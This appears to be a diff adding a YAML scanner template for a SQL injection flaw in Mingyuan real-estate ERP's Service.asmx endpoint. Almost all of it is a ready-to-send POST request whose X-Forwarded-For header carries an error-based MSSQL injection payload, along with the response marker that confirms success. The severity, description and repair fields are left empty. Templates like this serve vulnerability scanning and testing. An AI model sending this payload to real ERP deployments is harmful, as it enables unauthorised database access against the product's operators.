@@ -1,0 +1,29 @@
+id:
+info:
+  name: 明源地产ERP Service.asmx X-Forwarded-For注入漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /Kfxt/Service.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    Content-Length: length
+    X-Forwarded-For: 127.0.0.1') AND 6994 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (6994=6994) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(107)+CHAR(113))) AND ('MEuY'='MEuY
+    SOAPAction: "http://www.mysoft.com.cn/queryReceive"
+  data: |
+    <?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+        <queryReceive xmlns="http://www.mysoft.com.cn/">
+          <inpXML>&lt;xml&gt;&lt;buname&gt;abc&lt;/buname&gt;&lt;/xml&gt;</inpXML>
+        </queryReceive>
+      </soap:Body>
+    </soap:Envelope>
+response1:
+  body: qzjz
+  code: 200
+requests2:
+response2:
